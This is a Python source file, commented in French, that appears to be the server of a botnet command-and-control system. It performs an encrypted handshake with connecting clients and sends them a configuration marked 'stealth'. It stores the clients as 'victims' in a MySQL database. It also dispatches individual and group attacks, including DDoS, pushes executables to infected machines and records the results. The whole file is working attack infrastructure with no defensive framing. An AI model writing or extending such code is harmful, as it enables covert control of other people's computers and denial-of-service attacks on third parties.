import argparse
import os
import mysql.connector
import json
import socket
import select
import threading
import rsa
import base64
import re

from env import *
from database import *
from network import *
from functions import *
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from queue import Queue, Empty




def start_server(port):
    clients = []

    # Socket
    host = "0.0.0.0"
    port = port

    socket_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    socket_server.setblocking(0)
    socket_server.bind((host, port))
    socket_server.listen()
    print("ecoute sur : " + str(host) + ":" + str(port))


    connection_list = [socket_server]

    # Database
    db = mysql.connector.connect(
        host=DBHOST,
        user=DBUSER,
        password=DBPASSWORD,
        database=DB
    )


    mycursor = db.cursor()

    running = True


    while running:
        # print("[+] server is running")

        db.cmd_refresh(1)

        read_sockets, write_sockets, error_sockets = select.select(connection_list, [], connection_list, 3)


        for sock in read_sockets:
            # Nouvelle connexion
            if sock is socket_server:
                conn, addr = sock.accept()


                # Handshake
                print("(+) handshake with " + str(addr))

                # Récupération de la clé publique du client (451 octets)
                public_key = rsa.PublicKey.load_pkcs1_openssl_pem(conn.recv(451))

                # Génération de la clé symétrique
                sym_key = get_random_bytes(16)
                iv = get_random_bytes(16)

                json_conf = '{"action":"' + base64.b64encode("client_config".encode()).decode() + '","b64symetric":"' + base64.b64encode(sym_key).decode() + '","b64iv":"' + base64.b64encode(iv).decode() + '","multithread":true,"stealth":true}'

                # Chiffrement de la data avec la clé publique du client
                encrypted_sym_key = rsa.encrypt(json_conf.encode(), public_key)

                # Envoi de la clé symétrique chiffrée (256 octets)
                conn.sendall(encrypted_sym_key)

                print("[+] Waiting for client handshake informations")

                # Réception de la configuration du client (96 octets)
                received_data = conn.recv(96)

                cipher = AES.new(sym_key, AES.MODE_CBC, iv=iv)
                pt = unpad(cipher.decrypt(received_data), AES.block_size).decode('utf-8')
                print("\t(+) config received")

                # Récupération de l'uid client
                uid = json.loads(pt)["uid"]
                client_os = json.loads(pt)["os"]

                print("\t(+) uid : " + str(uid))


                # Ajout de la victime en base de données
                add_victim_to_db(db, mycursor, uid, client_os, addr[0], sym_key, "testupdated")


                # Création des threads d'émission et de réception
                emission_queue = Queue()
                thread_emission = threading.Thread(target=emission, args=(emission_queue, conn, addr, sym_key, iv))
                thread_emission.start()

                reception_queue = Queue()
                thread_reception = threading.Thread(target=reception, args=(reception_queue, conn, addr, sym_key, iv))
                thread_reception.start()
                

                # Ajout du client à la liste des clients
                clients.append(dict(addr = addr, 
                                    conn = conn, 
                                    thread_emission = thread_emission, 
                                    emission_queue = emission_queue, 
                                    thread_reception = thread_reception, 
                                    reception_queue = reception_queue, 
                                    sym_key = sym_key, 
                                    iv = iv,
                                    uid = uid,
                                    os = client_os
                                ))


        
        # Récupération des attaques de groupe à lancer
        attacks = get_group_attacks(mycursor)

        # print("[?] retreiving group attacks")
        # print("\t[+] " + str(len(attacks)) + " attack(s) found")
        

        for attack in attacks:
            print("[+] executing attack :")
            print("\t {}", str(attack))

            # Récupération des ordinateurs du groupe
            query = "SELECT uid FROM victims WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = %s)"
            values = (attack[1], )

            mycursor.execute(query, values)
            victims_uid = mycursor.fetchall()


            attack_sent = False
            number_of_attackers = 0

            for victim_uid in victims_uid:
                for client in clients:
                    if client['uid'] == victim_uid[0]:
                        execute_attack(client, attack)
                        attack_sent = True
                        number_of_attackers += 1

            
            # Mise à jour de l'attaque si elle a été envoyée au moins une fois
            if attack_sent:
                query = "UPDATE group_attacks SET state = 'running', executed_rate = %s WHERE id = %s"
                exec_rate = str(number_of_attackers) +"/" + str(len(victims_uid))
                values = (exec_rate, attack[0], )

                mycursor.execute(query, values)

                db.commit()



            ##############################################################
        

        # Récupération des attaques individuelles à lancer
        attacks = get_victim_attacks(mycursor)

        # print("[?] retreiving victim attacks")
        # print("\t[+] " + str(len(attacks)) + " attack(s) found")
        

        for attack in attacks:

            # Récupération des données de l'attaque
            data = json.loads(attack[4])
            
            # Récupération des ordinateurs du groupe
            query = "SELECT uid FROM victims WHERE id = %s"
            values = (attack[1], )

            mycursor.execute(query, values)

            victims = mycursor.fetchall()

            for victim in victims:
                victim_uid = victim[0]
                for client in clients:
                    print("[+] executing victim attack :")
                    print("\t[+]", str(attack[2]))

                    execute_attack(client, attack)

                    # Mise à jour de l'attaque
                    query = "UPDATE victim_attacks SET state = 'running' WHERE id = %s"
                    values = (attack[0], )

                    mycursor.execute(query, values)

                    db.commit()
            
        #######################

        # Gestion des clients
        print("[+] " + str(len(clients)) + " client(s) connected")

        for client in clients:
            # Récupération des données clients

            try:
                client_data = client['reception_queue'].get(timeout=1)

                # Check si le client s'est deconnecté
                if client_data == b'disconnected':
                    print("[-] client disconnected " + str(client['addr']))

                    # Mise à jour du statut dans la base de données
                    update_status(db, mycursor, client['uid'])

                    # Arrêt du thread d'émission
                    client['emission_queue'].put(b"stop-thread")

                    clients.remove(client)
                    continue

                
                # Chargement du message en json
                # Demande d'executable {"request":"XXX"}
                # Retour d'attaque : {"id":"XXX","attack":"XXX","output":"XXX"}

                client_message = json.loads(re.sub('\n', '', client_data.decode()))

                if "request" in client_message:
                    # envoyer l'executable au client
                    send_executable_to_client(client_message["request"], client['os'], client['sym_key'], client['iv'], client['reception_queue'], client['emission_queue'])

                elif "attack" in client_message :
                    # interpreter le resultat de l'attaque
                    attack_type = client_message["attack"]
                    attack_id = client_message["id"]
                    attack_output = client_message["output"]

                    # Mise à jour de l'attaque
                    if attack_type == "ddos":
                        query = "UPDATE group_attacks SET state = 'done', result = %s WHERE id = %s"
                    else :
                        query = "UPDATE victim_attacks SET state = 'done', result = %s WHERE id = %s"
                    
                    values = (attack_output, attack_id, )
                    mycursor.execute(query, values)

                    db.commit()


                    print("[+] attack updated in the database (done !)")


            except Empty:
                pass
